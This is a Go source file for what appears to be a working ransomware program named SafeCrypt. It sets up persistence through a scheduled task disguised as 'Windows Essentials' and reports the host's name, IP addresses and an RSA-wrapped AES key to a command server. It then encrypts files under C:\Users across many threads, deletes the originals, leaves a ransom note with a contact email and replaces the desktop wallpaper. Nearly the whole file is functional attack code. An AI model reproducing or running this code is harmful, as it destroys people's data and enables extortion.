package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	b64 "encoding/base64"
	"encoding/hex"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"

	"SafeCrypt/Explorer"
	"SafeCrypt/assets"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

type Host struct {
	Hostname string   `json:"hostname"`
	IP       []string `json:"ip"`
}

type Key struct {
	EncryptedKey string `json:"EncryptedKey"`
}

func main() {
	// First thing first!!! Persistance!
	isPersistance := true
	err := Explorer.CreateScheduledTask("Windows Essentials")
	if err != nil {
		fmt.Println("Damm no persistance today!")
		isPersistance = false
	}

	madeCopy := Explorer.MakeCopy()
	if madeCopy {
		fmt.Println("We have persistance!")

	}

	contact := "hacker@hacked.com" // Insert contact email
	dir := "C:\\Users"                    // Insert starting directory

	suffixes := []string{
		".dll",
		".lib",
		".search-ms",
		".dat",
		".ini",
		".regtrans-ms",
		".ps1",
		".log2",
		".log1",
		".blf",
		".ldf",
		".lock",
		".cmd",
		".theme",
		".msi",
		".sys",
		".wpx",
		".cpl",
		".adv",
		".msc",
		".scr",
		".bat",
		".key",
		".ico",
		".shs",
		".dll",
		".hta",
		".desktopthemepack",
		".nomedia",
		".msu",
		".rtp",
		".msp",
		".idx",
		".ani",
		".386",
		".diagcfg",
		".bin",
		".mod",
		".ics",
		".com",
		".hlp",
		".nls",
		".cab",
		".exe",
		".diagpk",
		".icl",
		".ocx",
		".rom",
		".prf",
		".themepack",
		".msstyle",
		".lnk",
		".icns",
		".mpa",
		".drv",
		".cur",
		".diagcab",
		".encrypted",
	}

	excluded_files := []string{
		"readme_morocco.txt",
		"ntldr",
		"thumbs.db",
		"bootsect.bak",
		"autorun.inf",
		"ntuser.dat.log",
		"boot.ini",
		"iconcache.db",
		"bootfont.bin",
		"ntuser.dat",
		"ntuser.ini",
		"desktop.ini",
	}

	plaintextKey, encryptedKey, err := EncryptRandomKey()
	if err != nil {
		fmt.Println("That should not happened..", err)
		os.Exit(1)
	}

	key, err := hex.DecodeString(plaintextKey)

	if err != nil {
		panic(err)
	}

	proxyURL, err := getProxyFromRegistry()
    if err != nil {
        fmt.Println("Error getting proxy from registry:", err)
        os.Exit(1)
    }

    var proxyFunc func(*http.Request) (*url.URL, error)
    if proxyURL != nil {
        proxyFunc = http.ProxyURL(proxyURL)
    } else {
        proxyFunc = http.ProxyFromEnvironment
    }

    customTransport := &http.Transport{
        Proxy: proxyFunc,
        TLSClientConfig: &tls.Config{
            InsecureSkipVerify: true,
        },
    }

    httpClient := &http.Client{
        Transport: customTransport,
    }

	hostname, err := os.Hostname()
	if err != nil {
		fmt.Println("Failed to get hostname")
		hostname = "BlankHostname"
	}

	ifaces, err := net.Interfaces()
	if err != nil {
		fmt.Println("Why no IPs??")
		os.Exit(1)
	}

	var local_ip_list []string

	for _, iface := range ifaces {
		addrs, err := iface.Addrs()
		if err != nil {
			fmt.Println(err)
			continue
		}
		for _, addr := range addrs {
			switch v := addr.(type) {
			case *net.IPNet:
				if !v.IP.IsLoopback() && v.IP.To4() != nil {
					fmt.Println("Local IP address:", v.IP.String())
					local_ip_list = append(local_ip_list, v.IP.String())
				}
			}
		}
	}

	requestBodyGetInfo := map[string]interface{}{
		"Hostname": hostname,
		"IP":       local_ip_list,
	}

	requestBodyGetInfoBytes, err := json.Marshal(requestBodyGetInfo)
	if err != nil {
		fmt.Println("What have gone wrong here??")
		os.Exit(1)

	}

	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}

	resp, err := httpClient.Post(
		"http://localhost:4455/getInfo",
		"application/json",
		bytes.NewBuffer(requestBodyGetInfoBytes),
	)

	if err != nil {
		fmt.Println("Cloud not send request to localhost:4455!")
		os.Exit(1)

	}

	defer resp.Body.Close()

	requestBodyEncryptedKey := map[string]interface{}{
		"EncryptedKey": encryptedKey,
		"Hostname":     hostname,
	}

	requestBodyEncryptedKeyBytes, err := json.Marshal(requestBodyEncryptedKey)
	if err != nil {
		fmt.Println("Something is not as planned!")
		os.Exit(1)

	}

	resp, err = httpClient.Post(
		"http://localhost:4455/getKey",
		"application/json",
		bytes.NewBuffer(requestBodyEncryptedKeyBytes),
	)

	if err != nil {
		fmt.Println("Cloud not send keys.. aborting!")
		os.Exit(1)

	}

	if resp.StatusCode != 200 {
		fmt.Println("No good...")
		os.Exit(1)

	} else {
		respBodyJson := make(map[string]interface{})
		err = json.NewDecoder(resp.Body).Decode(&respBodyJson)
		if err != nil {
			fmt.Println("Something here again is so wrong!!")
			os.Exit(1)

		}
		if respBodyJson["Status"] != "OK" {
			fmt.Println("Nothing is OK!!")
			os.Exit(1)

		}
	}

	defer resp.Body.Close()
	fmt.Printf("Status Code %d\n", resp.StatusCode)

	files := Explorer.MapFiles(dir)
	var fixed_files []string

	for _, file_name := range files {
		if hasMatchingSuffix(file_name, suffixes) || hasMatchingSuffix(file_name, excluded_files) {
			continue

		} else {
			fixed_files = append(fixed_files, file_name)
		}

	}

	var wg sync.WaitGroup
	var num_of_threads int

	start := time.Now()

	num_of_threads, num_of_files_per_thread, num_of_threads_to_add_extra_files := Explorer.CalcThreads(fixed_files)

	wg.Add(num_of_threads)
	num_of_files_to_add_thread := 0

	for i := 0; i < num_of_threads; i++ {

		if i < num_of_threads_to_add_extra_files {
			num_of_files_to_add_thread = num_of_files_per_thread + 1

		} else {
			num_of_files_to_add_thread = num_of_files_per_thread
		}

		files_of_thread := fixed_files[:num_of_files_to_add_thread]

		go func() {
			defer wg.Done()
			RunWG(files_of_thread, key)

		}()

		fixed_files = fixed_files[num_of_files_to_add_thread:]

	}

	wg.Wait()

	elapsed := time.Since(start)
	fmt.Println("Time it took to encrypt all of the files ", elapsed)

	msg := "Your files have been encrypted.\nContact " + contact + " to get the decrypt key."
	readmeFile := os.Getenv("USERPROFILE") + "\\Desktop\\readme_morocco.txt"

	err = os.WriteFile(readmeFile, []byte(msg), 0644)
	if err != nil {
		fmt.Println("Failed to write readme_morocco.txt!")

	} else {
		openReadMeFile(readmeFile)

	}

	setWallpaper()

	if isPersistance {
		err = Explorer.DeleteScheduledTask("Windows Essentials")
		if err != nil {
			fmt.Println("Something  went wrong..")

		}

		fmt.Println("Deleted Persistance!")
	}

}

func hasMatchingSuffix(filename string, suffixes []string) bool {
	lowerFilename := strings.ToLower(filename)
	for _, suffix := range suffixes {
		if strings.HasSuffix(lowerFilename, strings.ToLower(suffix)) {
			return true
		}
	}
	return false
}

func RunWG(fixed_files []string, key []byte) {
	for _, v := range fixed_files {
		hFile, err := os.Stat(v)
		if err != nil {
			continue
		}

		if hFile.Size() == 0 {
			continue
		}

		if hFile.IsDir() {
			continue
		}

		dst, err := os.Create(v + ".encrypted")
		if err != nil {
			continue
		}

		inFile, err := os.Open(v)
		if err != nil {
			continue
		}

		// Create a 128 bits cipher.Block for AES-256
		block, err := aes.NewCipher(key)
		if err != nil {
			continue
		}

		// The IV needs to be unique, but not secure
		iv := make([]byte, aes.BlockSize)
		if _, err = io.ReadFull(rand.Reader, iv); err != nil {
			inFile.Close()
			continue
		}

		// Get a stream for encrypt/decrypt in counter mode (best performance I guess)
		stream := cipher.NewCTR(block, iv)

		// Write the Initialization Vector (iv) as the first block
		// of the dst writer
		dst.Write(iv)

		// Open a stream to encrypt and write to dst
		writer := &cipher.StreamWriter{S: stream, W: dst}

		// Copy the input file to the dst writer, encrypting as we go.
		if _, err = io.Copy(writer, inFile); err != nil {
			inFile.Close()
			continue
		}

		inFile.Close()

		if err = os.Remove(v); err != nil {
			fmt.Println("Failed to remove ", v, err)
		}
	}
}

func setWallpaper() {

	temp_folder := os.TempDir()
	wallpaper_location := temp_folder + "\\wallpaper.png"

	wallpaper, err := assets.Asset("assets/wallpaper3.jpg")
	if err != nil {
		fmt.Println("Error with wallpaper.jpg", err)
		panic(err)

	}

	os.WriteFile(wallpaper_location, wallpaper, 0644)

	k, err := registry.OpenKey(
		registry.CURRENT_USER,
		"Control Panel\\Desktop",
		registry.QUERY_VALUE|registry.SET_VALUE,
	)

	if err != nil {
		fmt.Println("error opening registry key value", err)
		return

	}

	if err := k.SetStringValue(
		"Wallpaper",
		wallpaper_location,
	); err != nil {
		fmt.Println("Error setting wallpaper!", err)
		return

	}

	if err := k.SetStringValue(
		"WallpaperStyle",
		"2",
	); err != nil {
		fmt.Println("Error setting wallpaper style!", err)

	}
	if err := k.Close(); err != nil {
		fmt.Println("Error closing registry!")

	}

	user32 := syscall.NewLazyDLL("user32.dll")
	proc := user32.NewProc("SystemParametersInfoW")
	wallpaper_locatinon_ptr, err := syscall.UTF16PtrFromString(wallpaper_location)
	if err != nil {
		fmt.Println("Error with parsing string!")
		return
	}

	var (
		uiAction uintptr = 20
		uiParam  uintptr = 0
		pvParam  uintptr = uintptr(unsafe.Pointer(wallpaper_locatinon_ptr))
		fWinIni  uintptr = 3
	)

	ret, _, err := proc.Call(
		uiAction,
		uiParam,
		pvParam,
		fWinIni,
	)
	if ret == 0 || err == nil {
		fmt.Println("Error running SystemParametersInfoW..")
		fmt.Println("ret is ", ret, "\nErr is ", err)
	}

}

func EncryptRandomKey() (string, string, error) {
	key := make([]byte, 32)

	_, err := io.ReadFull(rand.Reader, key)

	if err != nil {
		return "", "", err
	}

	hexKey := hex.EncodeToString(key)

	fmt.Println("The generated key is ", hexKey)

	publicKeyAsset, _ := assets.Asset("assets/public_key.pem")

	block, _ := pem.Decode(publicKeyAsset)
	if block == nil {
		fmt.Println("Error parsing the public key")
		return "", "", nil

	}

	publicKey, err := x509.ParsePKCS1PublicKey(block.Bytes)
	if err != nil {
		fmt.Println("Error parsing againg the public key")
		return "", "", err

	}

	ciphertext, err := encryptKey([]byte(hexKey), publicKey)
	if err != nil {
		fmt.Println("We are fucked!")
		return "", "", err

	}

	base64EncodedKey := b64.StdEncoding.EncodeToString(ciphertext)

	return hexKey, base64EncodedKey, nil

}

func encryptKey(plaintext []byte, publicKey *rsa.PublicKey) ([]byte, error) {

	ciphertext, err := rsa.EncryptPKCS1v15(
		rand.Reader,
		publicKey,
		plaintext,
	)

	if err != nil {
		return nil, err

	}

	return ciphertext, nil
}

func openReadMeFile(fileLocation string) error {

	pathPtr, err := syscall.UTF16PtrFromString(fileLocation)
	if err != nil {
		fmt.Println(err)
		return err
	}

	verbPtr, _ := syscall.UTF16PtrFromString("open")
	ret, _, err := syscall.NewLazyDLL("shell32.dll").NewProc("ShellExecuteW").Call(
		0,
		uintptr(unsafe.Pointer(verbPtr)),
		uintptr(unsafe.Pointer(pathPtr)),
		0,
		0,
		windows.SW_SHOWMAXIMIZED,
	)

	if ret <= 32 {
		fmt.Println("Error: ", err)
		return err
	}

	return nil
}


func getProxyFromRegistry() (*url.URL, error) {
    key, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Internet Settings`, registry.QUERY_VALUE)
    if err != nil {
        return nil, err
    }
    defer key.Close()

    proxyServer, _, err := key.GetStringValue("ProxyServer")
    if err != nil {
        return nil, err
    }

    proxyEnable, _, err := key.GetIntegerValue("ProxyEnable")
    if err != nil {
        return nil, err
    }

    if proxyEnable == 1 && proxyServer != "" {
        proxyURL, err := url.Parse("http://" + proxyServer)
        if err != nil {
            return nil, err
        }
        return proxyURL, nil
    }

    return nil, nil
}